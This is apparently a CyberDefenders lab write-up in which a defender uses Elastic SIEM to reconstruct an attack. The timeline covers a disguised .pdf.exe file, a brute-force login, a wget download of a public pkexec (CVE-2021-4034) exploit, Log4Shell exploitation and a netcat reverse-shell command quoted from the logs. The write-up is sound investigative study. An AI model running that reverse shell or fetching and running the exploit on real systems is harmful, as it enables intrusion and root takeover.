# Title  
Elastic Case - Malware Investigation


# Tools and Environment 
Platform: Cyberdefenders  
Tools: Elastic SIEM in a simulated lab environment  


# Context
An employee was tricked into downloading and running a malicious file. 

On top of that, the systems were not updated and the attacker was able to pivot within the compromised system. 


# Attack Timeline

[Pre-Compromise Activity]
Feb 2, 2022 @ 16:58:17 - rundll32.exe accesses registry key HKLM\SYSTEM\ControlSet001\Control\Lsa\  


Feb 2, 2022 @ 17:08:46 - Powershell (pid 11676) creates file "__PSScriptPolicyTest_bymwxuft.3b5.ps1"  


Feb 2, 2022 @ 17:10:47 - Parent process "rundll32.exe" spawns cmd under NT AUTHORITY privileges.   


Feb 2, 2022 @ 17:12:54 - Powershell (pid 8836) changes filename "ModuleAnalysisCache"  


[Phase 1 - Linux Lateral Movement]
Feb 2, 2022 @ 17:43:45 - A brute force attack successfully logged onto user "salem"  


Feb 2, 2022 @ 17:44:55 - Attacker downloaded exploit "https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py" from GitHub repo using wget.   


Feb 2, 2022 @ 17:45:06 - After running the exploit, new process "pkexec" spawns  


Feb 2, 2022 @ 17:46:16 - The attacker gets an interactive shell by running command "bash -i" on process id 3011 with the root user.   


[Phase 2 - Windows Compromise] 
Feb 2, 2022 @ 18:08:25 - Employee "ahmed" runs the malicious file "Acount_details.pdf.exe" on host DESKTOP-Q1SL9P2   


Feb 2, 2022 @ 18:08:26 - Another user "cybery" also runs the same malicious file on the same host  


Feb 2, 2022 @ 18:08:26 - User "cybery" uploaded a DLL file of size 8704 named "mCblHDgWP.dll"    


[Phase 3 - Log4Shell Exploitation]
Feb 3, 2022 @ 01:51:04 - Attacker delivers JNDI payload via vulnerable Solr endpoint, exploiting Log4Shell (CVE-2021-44228) to achieve remote code execution   


[Phase 4 - Reverse Shell and C2]
Feb 3, 2022 @ 01:57:21 - Attacker runs command "nc -e /bin/bash 192.168.1.10 9999" to get reverse shell   

Feb 3, 2022 @ 02:09:22 - User "solr" runs netcat on host "CentOS"


# Key Findings 
1. Multiple systems compromised
2. File was disguised to trick users pdf.exe
3. User "cybery" was a privileged account which made attacks increased attacker's impact.
4. System was compromised before the initial main attack chain began.
5. Reverse shell used to maintain access. 
6. C2 traffic stayed internal (reverse shell connected to internal IP: 192.168.1.10)



# Lessons Learned 
1. Context is critical in investigations. Each finding builds on the previous one. Understanding how questions and events connect to each other is what separates 
isolated observations from a coherent attack narrative.

2. Chronological ordering reveals the full picture. Sorting events by timestamp rather than investigation order exposed that the system was already compromised before the main attack chain began, which would have been missed otherwise.

3. Kibana as an investigative tool. I gained hands-on experience navigating Kibana's Discover view, alert dashboard, and process tree analyzer to pivot across multiple 
log sources and reconstruct attacker activity.

